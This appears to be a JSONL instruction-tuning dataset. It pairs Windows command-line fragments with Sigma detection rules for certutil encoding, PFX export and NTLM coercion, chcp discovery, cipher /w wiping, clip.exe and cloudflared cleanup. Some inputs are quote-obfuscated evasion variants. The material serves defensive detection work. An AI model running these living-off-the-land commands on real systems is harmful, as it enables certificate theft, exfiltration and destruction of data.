{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -encode .acl .bat .doc .gif .jpeg .jpg .mp3 .pdf .png .ppt .tmp .xls .xml", "output": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -encode .acl .bat .doc .gif .jpeg .jpg \\\".\\\"\\\"m\\\"\\\"p\\\"\\\"3\\\" .pdf .png .ppt .tmp .xls .xml", "output": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe --encode .acl .bat .doc .gif .jpeg .jpg .mp3 .pdf .png .ppt .tmp .xls .xml", "output": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -encode .acl .bat .doc .gif .jpeg .jpg .mp3 .pdf .png .ppt .tmp .xls .xml", "output": "title: File Encoded To Base64 Via Certutil.EXE\nid: e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a\nstatus: test\ndescription: Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil\n    - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\n    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-02-24\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-encode'\n    condition: all of selection_*\nfalsepositives:\n    - As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -exportPFX", "output": "title: Certificate Exported Via Certutil.EXE\nid: 3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5\nstatus: test\ndescription: Detects the execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates.\nreferences:\n    - https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-exportPFX '\n    condition: all of selection_*\nfalsepositives:\n    - There legitimate reasons to export certificates. Investigate the activity to determine if it's benign\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe \"-expo\"rtPFX", "output": "title: Certificate Exported Via Certutil.EXE\nid: 3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5\nstatus: test\ndescription: Detects the execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates.\nreferences:\n    - https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-exportPFX '\n    condition: all of selection_*\nfalsepositives:\n    - There legitimate reasons to export certificates. Investigate the activity to determine if it's benign\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil CertUtil -exportPFX", "output": "title: Certificate Exported Via Certutil.EXE\nid: 3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5\nstatus: test\ndescription: Detects the execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates.\nreferences:\n    - https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-exportPFX '\n    condition: all of selection_*\nfalsepositives:\n    - There legitimate reasons to export certificates. Investigate the activity to determine if it's benign\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -exportPFX", "output": "title: Certificate Exported Via Certutil.EXE\nid: 3ffd6f51-e6c1-47b7-94b4-c1e61d4117c5\nstatus: test\ndescription: Detects the execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates.\nreferences:\n    - https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1027\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|windash: '-exportPFX '\n    condition: all of selection_*\nfalsepositives:\n    - There legitimate reasons to export certificates. Investigate the activity to determine if it's benign\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe CertUtil.exe -syncwithWU \\\\\\\\", "output": "title: Potential NTLM Coercion Via Certutil.EXE\nid: 6c6d9280-e6d0-4b9d-80ac-254701b64916\nstatus: test\ndescription: Detects possible NTLM coercion via certutil using the 'syncwithWU' flag\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/issues/243\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-01\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -syncwithWU '\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\certutil.exe\\\" CertUtil.exe -syncwithWU \\\\\\\\", "output": "title: Potential NTLM Coercion Via Certutil.EXE\nid: 6c6d9280-e6d0-4b9d-80ac-254701b64916\nstatus: test\ndescription: Detects possible NTLM coercion via certutil using the 'syncwithWU' flag\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/issues/243\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-01\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -syncwithWU '\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil CertUtil -syncwithWU \\\\\\\\", "output": "title: Potential NTLM Coercion Via Certutil.EXE\nid: 6c6d9280-e6d0-4b9d-80ac-254701b64916\nstatus: test\ndescription: Detects possible NTLM coercion via certutil using the 'syncwithWU' flag\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/issues/243\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-01\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -syncwithWU '\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\certutil.exe \\\\\\\\ -syncwithWU CertUtil.exe", "output": "title: Potential NTLM Coercion Via Certutil.EXE\nid: 6c6d9280-e6d0-4b9d-80ac-254701b64916\nstatus: test\ndescription: Detects possible NTLM coercion via certutil using the 'syncwithWU' flag\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/issues/243\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-01\nmodified: 2023-02-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -syncwithWU '\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe -c -r -k \\chcp.com", "output": "title: Console CodePage Lookup Via CHCP\nid: 7090adee-82e2-4269-bd59-80691e7c6338\nstatus: test\ndescription: Detects use of chcp to look up the system locale value as part of host discovery\nreferences:\n    - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp\nauthor: _pete_0, TheDFIRReport\ndate: 2022-02-21\nmodified: 2024-03-05\ntags:\n    - attack.discovery\n    - attack.t1614.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|contains|windash:\n            - ' -c '\n            - ' -r '\n            - ' -k '\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - 'chcp'\n            - 'chcp '\n            - 'chcp  '\n    condition: selection\nfalsepositives:\n    - During Anaconda update the 'conda.exe' process will eventually execution the 'chcp' command.\n    - Discord was seen using chcp to look up code pages\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe -c -r -k \\\"\\chcp.com\\\"", "output": "title: Console CodePage Lookup Via CHCP\nid: 7090adee-82e2-4269-bd59-80691e7c6338\nstatus: test\ndescription: Detects use of chcp to look up the system locale value as part of host discovery\nreferences:\n    - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp\nauthor: _pete_0, TheDFIRReport\ndate: 2022-02-21\nmodified: 2024-03-05\ntags:\n    - attack.discovery\n    - attack.t1614.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|contains|windash:\n            - ' -c '\n            - ' -r '\n            - ' -k '\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - 'chcp'\n            - 'chcp '\n            - 'chcp  '\n    condition: selection\nfalsepositives:\n    - During Anaconda update the 'conda.exe' process will eventually execution the 'chcp' command.\n    - Discord was seen using chcp to look up code pages\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd -c -r -k \\chcp.com", "output": "title: Console CodePage Lookup Via CHCP\nid: 7090adee-82e2-4269-bd59-80691e7c6338\nstatus: test\ndescription: Detects use of chcp to look up the system locale value as part of host discovery\nreferences:\n    - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp\nauthor: _pete_0, TheDFIRReport\ndate: 2022-02-21\nmodified: 2024-03-05\ntags:\n    - attack.discovery\n    - attack.t1614.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|contains|windash:\n            - ' -c '\n            - ' -r '\n            - ' -k '\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - 'chcp'\n            - 'chcp '\n            - 'chcp  '\n    condition: selection\nfalsepositives:\n    - During Anaconda update the 'conda.exe' process will eventually execution the 'chcp' command.\n    - Discord was seen using chcp to look up code pages\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe -r \\chcp.com -c -k", "output": "title: Console CodePage Lookup Via CHCP\nid: 7090adee-82e2-4269-bd59-80691e7c6338\nstatus: test\ndescription: Detects use of chcp to look up the system locale value as part of host discovery\nreferences:\n    - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp\nauthor: _pete_0, TheDFIRReport\ndate: 2022-02-21\nmodified: 2024-03-05\ntags:\n    - attack.discovery\n    - attack.t1614.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\cmd.exe'\n        ParentCommandLine|contains|windash:\n            - ' -c '\n            - ' -r '\n            - ' -k '\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - 'chcp'\n            - 'chcp '\n            - 'chcp  '\n    condition: selection\nfalsepositives:\n    - During Anaconda update the 'conda.exe' process will eventually execution the 'chcp' command.\n    - Discord was seen using chcp to look up code pages\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\chcp.com", "output": "title: Suspicious CodePage Switch Via CHCP\nid: c7942406-33dd-4377-a564-0f62db0593a3\nstatus: test\ndescription: Detects a code page switch in command line or batch scripts to a rare language\nreferences:\n    - https://learn.microsoft.com/en-us/windows/win32/intl/code-page-identifiers\n    - https://twitter.com/cglyer/status/1183756892952248325\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019-10-14\nmodified: 2023-03-07\ntags:\n    - attack.t1036\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - ' 936'    # Chinese\n            # - ' 1256' # Arabic\n            - ' 1258'   # Vietnamese\n            # - ' 855'  # Russian\n            # - ' 866'  # Russian\n            # - ' 864'  # Arabic\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity (adjust code pages according to your organization's region)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"c\"\"h\"\"c\"\"p\"\".\"\"c\"\"o\"\"m\"", "output": "title: Suspicious CodePage Switch Via CHCP\nid: c7942406-33dd-4377-a564-0f62db0593a3\nstatus: test\ndescription: Detects a code page switch in command line or batch scripts to a rare language\nreferences:\n    - https://learn.microsoft.com/en-us/windows/win32/intl/code-page-identifiers\n    - https://twitter.com/cglyer/status/1183756892952248325\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019-10-14\nmodified: 2023-03-07\ntags:\n    - attack.t1036\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - ' 936'    # Chinese\n            # - ' 1256' # Arabic\n            - ' 1258'   # Vietnamese\n            # - ' 855'  # Russian\n            # - ' 866'  # Russian\n            # - ' 864'  # Arabic\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity (adjust code pages according to your organization's region)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\chcp.com", "output": "title: Suspicious CodePage Switch Via CHCP\nid: c7942406-33dd-4377-a564-0f62db0593a3\nstatus: test\ndescription: Detects a code page switch in command line or batch scripts to a rare language\nreferences:\n    - https://learn.microsoft.com/en-us/windows/win32/intl/code-page-identifiers\n    - https://twitter.com/cglyer/status/1183756892952248325\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019-10-14\nmodified: 2023-03-07\ntags:\n    - attack.t1036\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\chcp.com'\n        CommandLine|endswith:\n            - ' 936'    # Chinese\n            # - ' 1256' # Arabic\n            - ' 1258'   # Vietnamese\n            # - ' 855'  # Russian\n            # - ' 866'  # Russian\n            # - ' 864'  # Arabic\n    condition: selection\nfields:\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity (adjust code pages according to your organization's region)\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "CIPHER.EXE \\cipher.exe /w:", "output": "title: Deleted Data Overwritten Via Cipher.EXE\nid: 4b046706-5789-4673-b111-66f25fe99534\nstatus: test\ndescription: |\n    Detects usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk.\n    Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.\n    Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md#atomic-test-3---overwrite-deleted-data-on-c-drive\nauthor: frack113\ndate: 2021-12-26\nmodified: 2023-02-21\ntags:\n    - attack.impact\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'CIPHER.EXE'\n        - Image|endswith: '\\cipher.exe'\n    selection_cli:\n        CommandLine|contains: ' /w:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "CIPHER.EXE \\cipher.exe /\"w\"\":\"", "output": "title: Deleted Data Overwritten Via Cipher.EXE\nid: 4b046706-5789-4673-b111-66f25fe99534\nstatus: test\ndescription: |\n    Detects usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk.\n    Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.\n    Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md#atomic-test-3---overwrite-deleted-data-on-c-drive\nauthor: frack113\ndate: 2021-12-26\nmodified: 2023-02-21\ntags:\n    - attack.impact\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'CIPHER.EXE'\n        - Image|endswith: '\\cipher.exe'\n    selection_cli:\n        CommandLine|contains: ' /w:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "CIPHER \\cipher /w:", "output": "title: Deleted Data Overwritten Via Cipher.EXE\nid: 4b046706-5789-4673-b111-66f25fe99534\nstatus: test\ndescription: |\n    Detects usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk.\n    Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.\n    Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md#atomic-test-3---overwrite-deleted-data-on-c-drive\nauthor: frack113\ndate: 2021-12-26\nmodified: 2023-02-21\ntags:\n    - attack.impact\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'CIPHER.EXE'\n        - Image|endswith: '\\cipher.exe'\n    selection_cli:\n        CommandLine|contains: ' /w:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "CIPHER.EXE \\cipher.exe /w:", "output": "title: Deleted Data Overwritten Via Cipher.EXE\nid: 4b046706-5789-4673-b111-66f25fe99534\nstatus: test\ndescription: |\n    Detects usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk.\n    Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.\n    Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md#atomic-test-3---overwrite-deleted-data-on-c-drive\nauthor: frack113\ndate: 2021-12-26\nmodified: 2023-02-21\ntags:\n    - attack.impact\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'CIPHER.EXE'\n        - Image|endswith: '\\cipher.exe'\n    selection_cli:\n        CommandLine|contains: ' /w:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\clip.exe clip.exe", "output": "title: Data Copied To Clipboard Via Clip.EXE\nid: ddeff553-5233-4ae9-bbab-d64d2bd634be\nstatus: test\ndescription: Detects the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1115/T1115.md\nauthor: frack113\ndate: 2021-07-27\nmodified: 2023-02-21\ntags:\n    - attack.collection\n    - attack.t1115\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\clip.exe'\n        - OriginalFileName: clip.exe\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\clip.exe \\\"clip\\\".exe", "output": "title: Data Copied To Clipboard Via Clip.EXE\nid: ddeff553-5233-4ae9-bbab-d64d2bd634be\nstatus: test\ndescription: Detects the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1115/T1115.md\nauthor: frack113\ndate: 2021-07-27\nmodified: 2023-02-21\ntags:\n    - attack.collection\n    - attack.t1115\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\clip.exe'\n        - OriginalFileName: clip.exe\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\clip clip", "output": "title: Data Copied To Clipboard Via Clip.EXE\nid: ddeff553-5233-4ae9-bbab-d64d2bd634be\nstatus: test\ndescription: Detects the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1115/T1115.md\nauthor: frack113\ndate: 2021-07-27\nmodified: 2023-02-21\ntags:\n    - attack.collection\n    - attack.t1115\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\clip.exe'\n        - OriginalFileName: clip.exe\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\clip.exe clip.exe", "output": "title: Data Copied To Clipboard Via Clip.EXE\nid: ddeff553-5233-4ae9-bbab-d64d2bd634be\nstatus: test\ndescription: Detects the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1115/T1115.md\nauthor: frack113\ndate: 2021-07-27\nmodified: 2023-02-21\ntags:\n    - attack.collection\n    - attack.t1115\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\clip.exe'\n        - OriginalFileName: clip.exe\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "tunnel cleanup -config -connector-id", "output": "title: Cloudflared Tunnel Connections Cleanup\nid: 7050bba1-1aed-454e-8f73-3f46f09ce56a\nstatus: test\ndescription: Detects execution of the \"cloudflared\" tool with the tunnel \"cleanup\" flag in order to cleanup tunnel connections.\nreferences:\n    - https://github.com/cloudflare/cloudflared\n    - https://developers.cloudflare.com/cloudflare-one/connections/connect-apps\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-17\nmodified: 2023-12-21\ntags:\n    - attack.command-and-control\n    - attack.t1102\n    - attack.t1090\n    - attack.t1572\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' tunnel '\n            - 'cleanup '\n        CommandLine|contains:\n            - '-config '\n            - '-connector-id '\n    condition: selection\nfalsepositives:\n    - Legitimate usage of Cloudflared.\nlevel: medium"}
